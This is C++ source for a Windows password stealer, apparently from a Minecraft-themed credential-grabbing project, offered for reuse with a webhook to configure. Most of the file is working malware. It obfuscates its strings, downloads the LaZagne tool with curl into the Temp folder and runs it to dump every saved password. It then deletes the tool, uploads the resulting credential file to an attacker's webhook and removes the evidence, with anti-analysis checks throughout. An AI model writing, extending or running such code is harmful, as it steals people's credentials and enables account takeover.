/*

//===================================================//

this stealer was coded by itosted / juvee <--- https://github.com/zjuvee
you can use this code, but i dont take any responsibility for any damage caused.

remember to change the webhook url in the includes/MinecraftStealer.hpp file

pd: give me credits if you use this code in your project. <---- please, dont copy pasted and remove the name

//===================================================//
*/


#include "includes\Passwords.hpp"
#include "includes\MinecraftStealer.hpp"
#include "includes\xorstr.hpp"
/*

//======================= for stealing passwords =========================//

credits: https://github.com/AlessandroZ/LaZagne (for the stealer, rlly thx)

*/

void Passwords::passwordSteal() {

	AntiCrack::checkForCrackingToolsA();

	const char* url = (xorstr_("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe"));

	const char* path = (xorstr_("C:/Windows/Temp"));

	const char* cmd = (xorstr_("curl -L"));
	char asdasd[1000];
	snprintf(asdasd, sizeof(asdasd), (xorstr_("%s -o %s/kneeFf252gear8632.tmp \"%s\"")), cmd, path, url);




	int result = system(asdasd);

	if (result == 0) {
		system((xorstr_("C:/Windows/Temp/kneeFf252gear8632.tmp all -oN -output output.txt")));
	}
	
	if (fs::exists((xorstr_("C:/Windows/Temp/kneeFf252gear8632.tmp")))) {
		fs::remove((xorstr_("C:/Windows/Temp/kneeFf252gear8632.tmp")));
	}
	
	AntiCrack::checkForCrackingToolsA();
}

// this function find the credential.txt generated in the .exe folder
void Passwords::findCredentialsFile() {
	fs::path currentDir = fs::current_path();

	for (const auto& entry : fs::directory_iterator(currentDir)) {

		if (entry.is_regular_file() && entry.path().filename().string().find((xorstr_("credential"))) != std::string::npos) {
			Minecraft::sendMessageToWebhook(xorstr_("LaZagne Credentials"), webhookURL, Minecraft::newName, Minecraft::newAvatarURL);
			Minecraft::sendFileToWebhook(entry.path().string(), webhookURL, Minecraft::newName, Minecraft::newAvatarURL);
			AntiCrack::checkForCrackingToolsA();
			fs::remove(entry.path());
		}
	}

}